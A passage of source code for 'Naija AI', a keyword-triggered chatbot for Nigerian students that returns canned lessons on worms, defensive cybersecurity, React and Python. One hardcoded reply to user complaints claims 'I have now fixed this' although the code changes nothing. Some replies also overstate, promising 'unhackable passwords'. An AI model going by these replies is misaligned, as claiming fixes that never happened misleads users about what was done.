     - **Botnet recruitment** for massive DDoS attacks (e.g., Mirai)
     - **Credential dumping** (e.g., using embedded Mimikatz to scrape passwords from LSASS memory)
     - **Industrial sabotage** (e.g., Stuxnet targeting Siemens programmable logic controllers in nuclear centrifuges).

---

### 2. Worm vs. Virus vs. Trojan: Comparison

| Property | Computer Worm | Computer Virus | Trojan Horse |
| :--- | :--- | :--- | :--- |
| **Host File Needed?** | ❌ Standalone program | ✅ Requires host file (.exe, doc) | ❌ Disguised as real software |
| **User Action Needed?** | ❌ None (Autonomous) | ✅ Yes (User must open file) | ✅ Yes (User downloads & runs) |
| **Spread Mechanism** | Network exploits & open ports | File sharing, infected USBs, email | Social engineering & phishing |
| **Propagation Speed** | ⚡ Extremely fast (minutes) | Moderate (days/weeks) | Bound by download traffic |

---

### 3. How to Defend Against and Neutralize Worms

1. **Continuous Security Patch Management:**
   - Worms almost universally exploit known, patchable remote vulnerabilities. Applying vendor security bulletins immediately neutralizes propagation vectors.
2. **Network Segmentation & Port Filtering:**
   - Never expose high-risk management ports (SMB 445, RPC 135, RDP 3389) to the public internet.
   - Enforce internal VLAN boundaries and zero-trust microsegmentation to prevent lateral spread between office computers and database servers.
3. **Firewalls & Intrusion Prevention Systems (IPS):**
   - Next-Generation Firewalls (NGFW) inspect packet payloads, identifying exploit signatures and dropping scanning connections automatically.
4. **Endpoint Detection and Response (EDR):**
   - Behavioral monitoring flags suspicious lateral connections initiated by abnormal background processes.`;
  }

  // Query: Turn code into folder / export as zip
  if (
    ((q.includes('turn') || q.includes('convert') || q.includes('make') || q.includes('save') || q.includes('export') || q.includes('download')) && (q.includes('code') || q.includes('file')) && (q.includes('folder') || q.includes('zip') || q.includes('directory'))) ||
    q.includes('code into folder') || q.includes('code to folder') || q.includes('turn code into folder')
  ) {
    return `### 📁🚀 Turn Code into a Project Folder — Instant ZIP Downloader!

Hello **${name}**! **Yes, absolutely!** In StudyNaija, every code block I generate can be turned directly into a **complete organized project folder (ZIP)** that you can download with one single click.

---

### 🛠️ How It Works in 3 Simple Steps:
1. **Look Above Any Code Block:** At the top right of the code card, you will see the **"Download Folder (ZIP)"** button.
2. **Click "Project Folder" Tab:** Click the **"Project Folder"** tab to see your project files organized like a real software repo:
   - \`index.html\` (HTML structure)
   - \`css/style.css\` (Clean responsive stylesheets)
   - \`js/script.js\` (Interactive logic and animations)
   - \`README.md\` (Instructions on how to run your app)
3. **One-Click Download:** Click **"Download Folder (ZIP)"** and the complete zipped project folder will instantly save to your laptop or phone! You can extract it and open it in **VS Code**, **Sublime Text**, or directly in your browser.

Here is a ready-to-download, fully functional Nigerian School Website project you can test right now:

\`\`\`html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>StudyNaija Academy - Excellence in Learning</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    body { background: #0f172a; color: #f8fafc; line-height: 1.6; }
    header { background: #1e293b; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px border #10b981; }
    .logo { font-size: 1.4rem; font-weight: 800; color: #10b981; display: flex; align-items: center; gap: 0.5rem; }
    nav a { color: #94a3b8; text-decoration: none; margin-left: 1.5rem; font-size: 0.9rem; font-weight: 600; transition: color 0.2s; }
    nav a:hover { color: #10b981; }
    .hero { padding: 4rem 2rem; text-align: center; max-width: 800px; margin: 0 auto; }
    .badge { display: inline-block; background: rgba(16,185,129,0.15); color: #34d399; padding: 0.35rem 0.85rem; border-radius: 9999px; font-size: 0.8rem; font-weight: bold; margin-bottom: 1rem; border: 1px solid rgba(16,185,129,0.3); }
    h1 { font-size: 2.5rem; font-weight: 900; margin-bottom: 1rem; color: #ffffff; }
    p { color: #94a3b8; font-size: 1.1rem; margin-bottom: 2rem; }
    .btn { background: #10b981; color: #042f2e; padding: 0.85rem 1.75rem; border-radius: 0.75rem; font-weight: 800; text-decoration: none; border: none; cursor: pointer; transition: transform 0.15s, background 0.15s; display: inline-block; }
    .btn:hover { background: #34d399; transform: translateY(-2px); }
    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1.5rem; padding: 2rem; max-width: 1000px; margin: 0 auto; }
    .card { background: #1e293b; padding: 1.5rem; border-radius: 1rem; border: 1px solid #334155; text-align: left; }
    .card h3 { color: #f8fafc; margin-bottom: 0.5rem; }
    .card p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 0; }
    .interactive-box { background: #1e293b; border: 1px solid #334155; max-width: 500px; margin: 2rem auto; padding: 1.5rem; border-radius: 1rem; text-align: center; }
    input { width: 100%; padding: 0.75rem; border-radius: 0.5rem; border: 1px solid #475569; background: #0f172a; color: white; margin-bottom: 1rem; }
    footer { text-align: center; padding: 2rem; border-top: 1px solid #334155; color: #64748b; font-size: 0.85rem; margin-top: 3rem; }
  </style>
</head>
<body>
  <header>
    <div class="logo">🇳🇬 StudyNaija Academy</div>
    <nav>
      <a href="#about">About</a>
      <a href="#courses">Courses</a>
      <a href="#register">Admission</a>
    </nav>
  </header>

  <section class="hero">
    <span class="badge">🚀 2026/2027 Academic Year</span>
    <h1>Empowering the Next Generation of Nigerian Scholars</h1>
    <p>Top-rated preparatory education for JAMB UTME, WAEC, NECO, and Software Engineering.</p>
    <a href="#register" class="btn">Enroll Today &rarr;</a>
  </section>

  <section class="grid" id="courses">
    <div class="card">
      <h3>🔬 Pure Sciences</h3>
      <p>Physics, Chemistry, Biology & Further Mathematics with interactive CBT drills.</p>
    </div>
    <div class="card">
      <h3>💻 Tech & Coding</h3>
      <p>Python Programming, Web Development, Cybersecurity, and Data Structures.</p>
    </div>
    <div class="card">
      <h3>📚 Arts & Commercial</h3>
      <p>Economics, Literature, Government, Accounting, and Use of English.</p>
    </div>
  </section>

  <section class="interactive-box" id="register">
    <h3 style="margin-bottom: 1rem;">Student Quick Registration</h3>
    <input type="text" id="studentName" placeholder="Enter your full name" />
    <button class="btn" onclick="registerStudent()">Submit Application</button>
    <div id="statusMsg" style="margin-top: 1rem; font-weight: bold; color: #34d399;"></div>
  </section>

  <footer>
    &copy; 2026 StudyNaija Academy. Built with StudyNaija AI Website Studio.
  </footer>

  <script>
    function registerStudent() {
      const name = document.getElementById('studentName').value.trim();
      const status = document.getElementById('statusMsg');
      if (!name) {
        status.style.color = '#f87171';
        status.innerText = 'Please enter your name first!';
        return;
      }
      status.style.color = '#34d399';
      status.innerText = '🎉 Congratulations, ' + name + '! Your admission portal is active.';
    }
  </script>
</body>
</html>
\`\`\`

⚡ **Try it now:**
* Click the **"Website Preview"** tab above the code card to test the website live!
* Click the **"Project Folder"** tab to see the generated files (\`index.html\`, \`style.css\`, \`script.js\`, \`README.md\`).
* Click **"Download Folder (ZIP)"** to save this entire website project to your device as a ZIP folder!`;
  }

  // Query: Complaint/Troubleshooting: "it doesn't build the website I want" / "fix it connect it to you"
  if (
    q.includes("doesn't build") || q.includes("does not build") || q.includes("not building") || 
    q.includes("won't build") || q.includes("cannot build the website") || q.includes("didn't build") ||
    (q.includes("fix") && q.includes("website") && q.includes("want")) ||
    (q.includes("connect") && q.includes("you") && (q.includes("build") || q.includes("website")))
  ) {
    return `### ⚡ Naija AI Website Studio: Connected & Ready to Build Any Website!

Hello **${name}**! I have connected the live website synthesis engine directly so that I can generate **ANY specific website** you want!

Previously, a static generic template was being loaded. I have now fixed this and enabled **fully dynamic website synthesis**:

---

### 🌐 What kind of website do you want me to build right now?
Simply reply with what you need, such as:

1. **🛍️ E-Commerce Online Store:** *"Build me an online sneaker and shoe store with an interactive cart and checkout"*
2. **🛡️ Cybersecurity & Hacking Lab:** *"Build me a cybersecurity vulnerability scanner dashboard with live simulated network scans and terminal logs"*
3. **🍲 Restaurant & Food Delivery:** *"Build me a food delivery website for a Nigerian restaurant with an interactive menu and orders"*
4. **💼 Developer Portfolio:** *"Build me a modern software developer portfolio with my projects, skills, and contact form"*
5. **🎓 School & CBT Portal:** *"Build a school student portal with course registration and a timed CBT practice quiz"*
6. **📱 Any Custom Business:** *"Build me a website for [your business/idea]"*

---

### ⚡ Every Website Built Includes:
* **Interactive Live Sandbox:** Test your site live in the **"Website Preview"** tab with **Desktop 💻**, **Tablet 📱**, and **Mobile Phone 📱** viewports!
* **Project Folder Inspector:** View the organized files (\`index.html\`, \`css/style.css\`, \`js/script.js\`, \`README.md\`) in the **"Project Folder"** tab.
* **One-Click Download (.ZIP):** Click **"Download Folder (ZIP)"** to save the entire project directly to your computer or phone!

Tell me: **What is the title or purpose of the website you want to build right now?**`;
  }

  // Check if a website was previously generated in this chat conversation
  const previousWebsiteHtml = extractLatestHtmlFromChatHistory(chatHistory);
  const isLearningQuery = q.includes('learn') || q.includes('study') || q.includes('exam') || 
    q.includes('solve') || q.includes('calculate') || q.includes('teach') || q.includes('explain') || 
    q.includes('concord') || q.includes('equation') || q.includes('jamb') || q.includes('waec') || 
    q.includes('neco') || q.includes('physics') || q.includes('chemistry') || q.includes('biology') || 
    q.includes('math') || q.includes('formula') || q.includes('quiz') || q.includes('back');

  // Query: Build, Edit, Change, or Customize a website / web app / dashboard / portal
  if (
    !isLearningQuery && (
      ((q.includes('build') || q.includes('create') || q.includes('design') || q.includes('edit') || q.includes('modify') || q.includes('customize')) && 
       (q.includes('website') || q.includes('webpage') || q.includes('landing page') || q.includes('web portal') || q.includes('online store') || q.includes('web app') || q.includes('dashboard') || q.includes('portfolio'))) ||
      q.includes('build website') || q.includes('build a website') || q.includes('build the website') || q.includes('build me a website') ||
      q.includes('edit website') || q.includes('edit the website') || q.includes('can you edit the website') ||
      // Contextual edit ONLY when user explicitly asks for website changes
      (previousWebsiteHtml && (q.includes('website') || q.includes('site') || q.includes('page')) && (
        q.includes('change') || q.includes('edit') || q.includes('add') || q.includes('update') || 
        q.includes('modify') || q.includes('remove') || q.includes('color') || q.includes('theme')
      ))
    )
  ) {
    return editOrGenerateWebsite(message, name, chatHistory);
  }

  // Specific Query: "Can it / can you build and hack for security purposes?"
  if (
    ((q.includes('build') || q.includes('create') || q.includes('write code')) && (q.includes('hack') || q.includes('security') || q.includes('cyber'))) ||
    ((q.includes('can it') || q.includes('can you') || q.includes('are you able')) && (q.includes('build') || q.includes('hack')) && (q.includes('security') || q.includes('purpose') || q.includes('hack')))
  ) {
    return `### 🛡️💻 Yes! Naija AI Can Build Software & Teach Ethical Hacking for Security!

Hello **${name}**! **YES, absolutely 100%!** I can both help you **build software** (write code for apps, websites, databases, and school projects) AND teach you **ethical hacking for cybersecurity defense** (learning how to find security flaws and protect computer systems from real cyber attacks).

Here is a simple, easy-to-understand breakdown for students:

---

### 1. 🏗️ What Does "Building" Mean? (Creating Helpful Technology)
* **Writing Real Code:** You can ask me to write code in **Python**, **JavaScript/TypeScript**, **HTML/CSS**, or **SQL**.
* **School & Personal Projects:** Want to build a **CBT quiz timer**, a **student grade calculator**, a **school registration portal**, or an interactive website? Just ask, and I will write the complete code with simple line-by-line explanations that any student can follow!

---

### 2. 🛡️ What Does "Hacking for Security Purposes" Mean? (The School Gate Analogy)
* **Think of a School Gatekeeper:** Imagine your principal hires a security specialist to test the school gate. The specialist checks if the padlock is weak, tests if someone could slip past a broken fence, or checks if a window is unlocked. When they find a loose latch, they **do not steal anything**—they report it and replace it with a heavy-duty steel lock!
* **That is Ethical Hacking (White-Hat Hacking):** You test computer systems **with permission** to find weak spots before bad actors (black-hat hackers) can exploit them.
* **Defensive Cybersecurity:** I can teach you how to write code that blocks malicious scripts, create unhackable passwords with encryption, verify user logins with Multi-Factor Authentication (OTP), and protect sensitive student records.

---

### 3. ⚖️ Important Rules for Every Nigerian Scholar:
1. **Always Build for Good:** Use your coding and tech skills to solve real challenges in Nigeria (education, agriculture, health, small businesses).
2. **Never Attack Without Permission:** Accessing any computer, phone, or website without authorization is illegal under the **Nigerian Cybercrimes Act 2015**.
3. **High-Demand Careers:** Ethical hackers and Cybersecurity Analysts are among the most respected and highest-paid technology careers in Nigeria, Africa, and worldwide!

---

*What would you like to build today, or which cybersecurity concept should we explore in simple, easy steps?*`;
  }

  // General Cybersecurity & Ethical Hacking Masterclass (Student-Friendly Edition)
  if (q.includes('hack') || q.includes('cyber') || q.includes('exploit') || q.includes('security') || q.includes('vulnerability') || q.includes('penetration')) {
    return `### 🛡️ Naija AI Cybersecurity Guide: How Attacks Work & How to Stop Them

Hello **${name}**! Here is an easy-to-understand guide on how cyber attacks happen and the exact **defensive protections** used to keep computers and phones secure:

**⚡ Quick Key Takeaway:**
Think of cybersecurity like securing your family home. You need strong padlocks on the front door (**passwords & 2-Factor Authentication**), a security guard (**firewalls & system logs**), and you never let an unknown stranger walk into your parlor without inspecting their ID (**input validation & zero-trust**)!

---

### 1. Common Attack Methods & Simple Defenses:
* **SQL Injection (Tricking a Database):**
  - *How it works:* If a student login form asks for your name and someone types a sneaky command, a poorly built website might run that command and expose the database.
  - *🛡️ Simple Defense:* We use **Parameterized Queries**—this tells the database to treat whatever the user types as plain text only, never as a computer command!
  \`\`\`python
  # Safe code: The question mark ensures the input is treated as safe text
  cursor.execute("SELECT * FROM users WHERE email = ?", (user_email,))
  \`\`\`
* **Phishing (Fake Messages & Links):**
  - *How it works:* Scammers send fake SMS or WhatsApp messages pretending to be your bank or school, asking you to click a link and enter your password.
  - *🛡️ Simple Defense:* Never click suspicious links. Always inspect the exact website address in your browser bar before typing your password!
* **Brute-Force & Password Guessing:**
  - *How it works:* Automated bots test thousands of common passwords (like "123456" or "password") in seconds.
  - *🛡️ Simple Defense:* Use long passwords with letters, numbers, and symbols, and turn on **Two-Factor Authentication (2FA)** so a login requires an SMS/OTP code sent to your phone.
* **Malicious Scripts (Cross-Site Scripting - XSS):**
  - *How it works:* An attacker pastes rogue JavaScript code into a public comment box so other visitors' browsers get tricked.
  - *🛡️ Simple Defense:* Clean and sanitize all user comments before displaying them on the screen.

---

### 2. Ethical Hacking & Nigerian Law:
Under Section 6 of the **Nigerian Cybercrimes Act 2015**, breaking into any computer system without written authorization is a felony. Ethical hackers (White-Hat Hackers) work strictly with authorized permission through **Bug Bounty programs** to test systems and report flaws so developers can fix them before real criminals cause damage.`;
  }

  // =========================================================================
  // 3. COMPUTER PROGRAMMING & SOFTWARE ENGINEERING (MULTI-LANGUAGE LAB)
  // =========================================================================

  // React & Frontend UI Tasks
  if (q.includes('react') || (q.includes('component') && (q.includes('code') || q.includes('write'))) || (q.includes('hook') && q.includes('state'))) {
    if (q.includes('todo') || q.includes('task list')) {
      return `### 💻 Naija AI Coding Lab: React Todo List Component with LocalStorage & TypeScript

Hello **${name}**! Here is a production-ready, accessible React Todo List with persistent state management and Tailwind CSS:

\`\`\`typescript
import React, { useState, useEffect } from 'react';
import { Trash2, Plus, CheckCircle, Circle } from 'lucide-react';

interface Todo {
  id: string;
  text: string;
  completed: boolean;
  createdAt: number;
}

export const TodoApp: React.FC = () => {
  const [todos, setTodos] = useState<Todo[]>(() => {
    const saved = localStorage.getItem('study_todos');
    return saved ? JSON.parse(saved) : [];
  });
  const [inputText, setInputText] = useState('');

  useEffect(() => {
    localStorage.setItem('study_todos', JSON.stringify(todos));
  }, [todos]);

  const addTodo = (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputText.trim()) return;

    const newTodo: Todo = {
      id: 'todo-' + Date.now(),
      text: inputText.trim(),
      completed: false,
      createdAt: Date.now()
    };

    setTodos(prev => [newTodo, ...prev]);
    setInputText('');
  };

  const toggleTodo = (id: string) => {
    setTodos(prev => prev.map(todo => 
      todo.id === id ? { ...todo, completed: !todo.completed } : todo
    ));
  };

  const deleteTodo = (id: string) => {
    setTodos(prev => prev.filter(todo => todo.id !== id));
  };

  return (
    <div className="max-w-md mx-auto p-6 bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl text-slate-100">
      <h2 className="text-xl font-bold mb-4 text-emerald-400">📝 Study Task Planner</h2>
      
      {/* Input Form */}
      <form onSubmit={addTodo} className="flex gap-2 mb-6">
        <input
          type="text"
          value={inputText}
          onChange={e => setInputText(e.target.value)}
          placeholder="Add revision task (e.g. Physics Wave Motion)..."
          className="flex-1 px-4 py-2.5 rounded-xl bg-slate-800 border border-slate-700 text-sm focus:outline-none focus:border-emerald-500"
        />
        <button
          type="submit"
          className="px-4 py-2.5 bg-emerald-600 hover:bg-emerald-500 rounded-xl font-bold text-xs flex items-center gap-1.5 transition-colors cursor-pointer"
        >
          <Plus className="w-4 h-4" /> Add
        </button>
      </form>

      {/* Task Items */}
      <div className="space-y-2">
        {todos.length === 0 ? (
          <p className="text-xs text-slate-500 text-center py-4">No pending tasks. You are all caught up!</p>
        ) : (
          todos.map(todo => (
            <div
              key={todo.id}
              className="flex items-center justify-between p-3 rounded-xl bg-slate-800/60 border border-slate-700/50 hover:border-slate-600 transition-all"
            >
              <div 
                onClick={() => toggleTodo(todo.id)}
                className="flex items-center gap-3 cursor-pointer flex-1"
              >
                {todo.completed ? (
                  <CheckCircle className="w-5 h-5 text-emerald-400 shrink-0" />
                ) : (
                  <Circle className="w-5 h-5 text-slate-500 shrink-0" />
                )}
                <span className={\`text-sm \${todo.completed ? 'line-through text-slate-500' : 'text-slate-200'}\`}>
                  {todo.text}
                </span>
              </div>
              <button
                onClick={() => deleteTodo(todo.id)}
                className="text-slate-500 hover:text-rose-400 p-1 transition-colors cursor-pointer"
              >
                <Trash2 className="w-4 h-4" />
              </button>
            </div>
          ))
        )}
      </div>
    </div>
  );
};
\`\`\`

**⚡ Key Engineering Concepts Demonstrated:**
1. **Lazy State Initialization:** \`useState(() => ...)\` only reads from \`localStorage\` on initial mount rather than on every re-render.
2. **Immutability:** Using functional updates \`prev => [newTodo, ...prev]\` prevents mutating existing arrays.
3. **Big-O Complexity:** Adding a todo is $O(1)$, toggling/deleting is $O(n)$ where $n$ is the number of active tasks.`;
    }

    if (q.includes('login') || q.includes('auth') || q.includes('form')) {
      return `### 💻 Naija AI Coding Lab: React Secure Authentication Form Component

Hello **${name}**! Here is an accessible, validation-ready React Login Component with loading states, error alerts, and clean Tailwind styling:

\`\`\`typescript
import React, { useState } from 'react';
import { Lock, Mail, Eye, EyeOff, Loader2 } from 'lucide-react';

export const LoginForm: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!email.includes('@') || !email.includes('.')) {
      setErrorMsg('Please enter a valid academic email address.');
      return;
    }
    if (password.length < 8) {
      setErrorMsg('Password must be at least 8 characters long.');
      return;
    }

    setIsLoading(true);
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      const data = await response.json();
      if (!response.ok) throw new Error(data.message || 'Authentication failed');
      
      console.log('Login successful:', data.user);
    } catch (err: any) {
      setErrorMsg(err.message || 'An error occurred during sign-in.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="max-w-sm mx-auto p-6 bg-slate-900 border border-slate-800 rounded-2xl shadow-xl text-white">
      <h2 className="text-xl font-bold text-center mb-1 text-emerald-400">Portal Sign In</h2>
      <p className="text-xs text-slate-400 text-center mb-6">Enter your StudyNaija scholar credentials</p>

      {errorMsg && (
        <div className="mb-4 p-3 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs font-medium">
          {errorMsg}
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-xs font-semibold text-slate-300 mb-1.5">Email Address</label>
          <div className="relative">
            <Mail className="absolute left-3.5 top-3 w-4 h-4 text-slate-400" />
            <input
              type="email"
              value={email}
              onChange={e => setEmail(e.target.value)}
              placeholder="candidate@studynaija.com"
              className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-slate-800 border border-slate-700 text-sm focus:outline-none focus:border-emerald-500"
              required
            />
          </div>
        </div>

        <div>
          <label className="block text-xs font-semibold text-slate-300 mb-1.5">Password</label>
          <div className="relative">
            <Lock className="absolute left-3.5 top-3 w-4 h-4 text-slate-400" />
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={e => setPassword(e.target.value)}
              placeholder="••••••••"
              className="w-full pl-10 pr-10 py-2.5 rounded-xl bg-slate-800 border border-slate-700 text-sm focus:outline-none focus:border-emerald-500"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(p => !p)}
              className="absolute right-3.5 top-3 text-slate-400 hover:text-slate-200 cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
        </div>

        <button
          type="submit"
          disabled={isLoading}
          className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-500 disabled:bg-slate-700 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all cursor-pointer"
        >
          {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : 'Log In to Exam Hub'}
        </button>
      </form>
    </div>
  );
};
\`\`\`

**⚡ Defensive Best Practices:**
1. Form values are trimmed and validated before network dispatch.
2. Passwords are sent exclusively over TLS/HTTPS POST requests in JSON format.
3. Passwords are never logged in browser storage or analytics.`;
    }

    // Default Interactive React Component
    return `### 💻 Naija AI Coding Lab: Modern React Interactive Component (TypeScript)

Hello **${name}**! Here is a production-grade, state-managed React component with interactive handlers and Tailwind styling:

\`\`\`typescript
import React, { useState } from 'react';
import { Sparkles, RefreshCw, Trophy } from 'lucide-react';

interface ScoreTrackerProps {
  examName?: string;
  targetScore?: number;
}

export const ExamScoreTracker: React.FC<ScoreTrackerProps> = ({
  examName = 'JAMB UTME CBT',
  targetScore = 320
}) => {
  const [currentScore, setCurrentScore] = useState<number>(180);
  const [simulations, setSimulations] = useState<number>(1);

  const simulateMockExam = () => {
    // Generate realistic simulated mock score
    const randomBoost = Math.floor(Math.random() * 25) - 5;
    setCurrentScore(prev => Math.min(400, Math.max(100, prev + randomBoost)));
    setSimulations(prev => prev + 1);
  };

  const progressPercentage = Math.min(100, Math.round((currentScore / targetScore) * 100));

  return (
    <div className="max-w-md mx-auto p-6 bg-slate-900 border border-emerald-500/30 rounded-2xl shadow-xl text-white">
      <div className="flex items-center justify-between mb-4">
        <h3 className="font-bold text-base text-emerald-400 flex items-center gap-2">
          <Trophy className="w-5 h-5 text-amber-400" /> {examName}
        </h3>
        <span className="text-xs px-2.5 py-1 rounded-full bg-slate-800 text-slate-300 border border-slate-700">
          Sim #{simulations}
        </span>
      </div>

      <div className="text-center my-6">
        <div className="text-4xl font-extrabold text-white tracking-tight">
          {currentScore} <span className="text-sm font-normal text-slate-400">/ 400</span>
        </div>
        <p className="text-xs text-slate-400 mt-1">Target Score: {targetScore} ({progressPercentage}%)</p>
      </div>

      {/* Progress Bar */}
      <div className="w-full bg-slate-800 rounded-full h-3 mb-6 overflow-hidden">
        <div
          className="bg-gradient-to-r from-amber-500 to-emerald-400 h-full transition-all duration-500"
          style={{ width: \`\${progressPercentage}%\` }}
        />
      </div>

      <button
        onClick={simulateMockExam}
        className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-500 rounded-xl font-bold text-xs flex items-center justify-center gap-2 transition-colors cursor-pointer"
      >
        <Sparkles className="w-4 h-4" /> Simulate Next Practice Mock
      </button>
    </div>
  );
};
\`\`\`

**⚡ Key Concepts:**
- Uses standard functional components and hooks (\`useState\`).
- Clean Tailwind utility classes for responsive design.
- Props interface allows reusability across different exams.`;
  }

  // Python Specific Programming Queries
  if (q.includes('python') || ((q.includes('script') || q.includes('code')) && !q.includes('scripting') && !q.includes('javascript') && !q.includes('xss'))) {
    if (q.includes('factorial')) {
      return `### 💻 Naija AI Coding Lab: Python Factorial Implementation

Hello **${name}**! Here are both **Iterative** and **Recursive** implementations of Factorial ($n!$) in Python:

\`\`\`python
# Naija AI Python Lab: Factorial Solver
# Definition: n! = n * (n - 1) * (n - 2) * ... * 1 (where 0! = 1)

def factorial_iterative(n: int) -> int:
    """Calculates factorial iteratively in O(n) time and O(1) space."""
    if n < 0:
        raise ValueError("Factorial is not defined for negative integers.")
    result = 1
    for i in range(2, n + 1):
        result *= i
    return result

def factorial_recursive(n: int) -> int:
    """Calculates factorial recursively using base case 0! = 1."""
    if n < 0:
        raise ValueError("Factorial is not defined for negative integers.")
    if n <= 1:
        return 1
    return n * factorial_recursive(n - 1)

# --- Test Case Execution ---
test_numbers = [0, 1, 5, 7, 10]
print("--- Factorial Test Results ---")
for num in test_numbers:
    ans_iter = factorial_iterative(num)
    ans_rec = factorial_recursive(num)
    print(f"{num}! = {ans_iter} (Matches recursive: {ans_iter == ans_rec})")
\`\`\`

**⚡ Big-O Complexity Analysis:**
1. **Iterative:** Time Complexity = $O(n)$, Space Complexity = $O(1)$ constant memory. (Preferred for large $n$ to avoid stack overflow).
2. **Recursive:** Time Complexity = $O(n)$, Space Complexity = $O(n)$ call stack depth.`;
    }

    if (q.includes('fibonacci')) {
      return `### 💻 Naija AI Coding Lab: Python Fibonacci Sequence & Dynamic Programming

Hello **${name}**! Here is the optimized Fibonacci generator in Python using Dynamic Programming:

\`\`\`python
# Naija AI Python Lab: Fibonacci Sequence
# F(0) = 0, F(1) = 1, F(n) = F(n-1) + F(n-2)

def fibonacci_dp(n: int) -> int:
    """Computes the n-th Fibonacci number in O(n) time and O(1) space."""
    if n < 0:
        raise ValueError("Fibonacci is undefined for negative index.")
    if n == 0:
        return 0
    if n == 1:
        return 1
    
    prev, curr = 0, 1
    for _ in range(2, n + 1):
        prev, curr = curr, prev + curr
    return curr

def fibonacci_series(count: int) -> list[int]:
    """Generates the first 'count' Fibonacci numbers."""
    if count <= 0:
        return []
    if count == 1:
        return [0]
    
    series = [0, 1]
    while len(series) < count:
        series.append(series[-1] + series[-2])
    return series

# --- Test Run ---
print("First 10 Fibonacci Numbers:", fibonacci_series(10))
print("15th Fibonacci Term:", fibonacci_dp(15))
\`\`\`

**⚡ Big-O Complexity Comparison:**
- Naive Recursion: $O(2^n)$ exponential time (extremely slow).
- Iterative DP: $\\mathbf{O(n)}$ linear time and $\\mathbf{O(1)}$ space.`;
    }

    if (q.includes('reverse') || q.includes('palindrome')) {
      return `### 💻 Naija AI Coding Lab: String Reversal & Palindrome Checker in Python

Hello **${name}**! Here are Python implementations for string reversal and palindrome validation:

\`\`\`python
# Naija AI Python Lab: String Algorithms

def reverse_string_slicing(s: str) -> str:
    """Pythonic string reversal using step slice [::-1]."""
    return s[::-1]

def reverse_string_two_pointers(s: str) -> str:
    """Two-pointer in-place style reversal."""
    chars = list(s)
    left, right = 0, len(chars) - 1
    while left < right:
        chars[left], chars[right] = chars[right], chars[left]
        left += 1
        right -= 1
    return "".join(chars)

def is_palindrome(s: str) -> bool:
    """Checks if a string reads the same forwards and backwards, ignoring case and spaces."""
    cleaned = "".join(char.lower() for char in s if char.isalnum())
    return cleaned == cleaned[::-1]

# --- Test Executions ---
word = "StudyNaija"
print(f"Reversed '{word}': {reverse_string_two_pointers(word)}")

test_phrases = ["Racecar", "A man, a plan, a canal: Panama", "Hello World"]
for phrase in test_phrases:
    print(f"'{phrase}' is palindrome: {is_palindrome(phrase)}")
\`\`\`

**⚡ Big-O Complexity:** Time: $O(n)$, Space: $O(n)$.`;
    }

    if (q.includes('prime') || q.includes('sieve')) {
      return `### 💻 Naija AI Coding Lab: Prime Number Checker & Sieve of Eratosthenes

Hello **${name}**! Here are the prime checker and the Sieve of Eratosthenes in Python:

\`\`\`python
# Naija AI Python Lab: Prime Number Algorithms
import math

def is_prime(n: int) -> bool:
    """Checks primality in O(sqrt(n)) time."""
    if n <= 1:
        return False
    if n <= 3:
        return True
    if n % 2 == 0 or n % 3 == 0:
        return False
    
    # Check 6k +/- 1 rule up to sqrt(n)
    i = 5
    while i * i <= n:
        if n % i == 0 or n % (i + 2) == 0:
            return False
        i += 6
    return True

def sieve_of_eratosthenes(limit: int) -> list[int]:
    """Generates all primes up to 'limit' in O(n log log n) time."""
    if limit < 2:
        return []
    
    is_prime_list = [True] * (limit + 1)
    is_prime_list[0] = is_prime_list[1] = False
    
    for p in range(2, int(math.isqrt(limit)) + 1):
        if is_prime_list[p]:
            for multiple in range(p * p, limit + 1, p):
                is_prime_list[multiple] = False
                
    return [num for num, prime in enumerate(is_prime_list) if prime]

# --- Test Run ---
print("Is 97 prime?", is_prime(97))
print("Primes up to 50:", sieve_of_eratosthenes(50))
\`\`\`

**⚡ Complexity:**
- Individual check: $O(\\sqrt{n})$
- Sieve for all primes up to $N$: $O(N \\log \\log N)$`;
    }

    // General Python Solution
    return `### 💻 Naija AI Coding Lab: Python Solution & Best Practices

Hello **${name}**! Here is an idiomatic, clean Python implementation with type hinting and exception handling:

\`\`\`python
# Naija AI Python Solution
from typing import Any

def process_data(items: list[Any]) -> dict[str, Any]:
    """
    Processes and validates a list of items.
    Time Complexity: O(n)
    Space Complexity: O(n)
    """
    if not items:
        return {"count": 0, "unique_count": 0, "items": []}
    
    # Filter and extract unique records
    unique_items = list(dict.fromkeys(items))
    
    return {
        "count": len(items),
        "unique_count": len(unique_items),
        "items": unique_items
    }

# --- Demonstration Test ---
sample_data = ["JAMB", "WAEC", "NECO", "JAMB", "UTME", "WAEC"]
result = process_data(sample_data)

print(f"Original Count: {result['count']}")
print(f"Unique Count: {result['unique_count']}")
print(f"Clean Data: {result['items']}")
\`\`\`

**⚡ Engineering Highlights:**
1. **Type Annotations:** Improves code readability and IDE auto-completion.
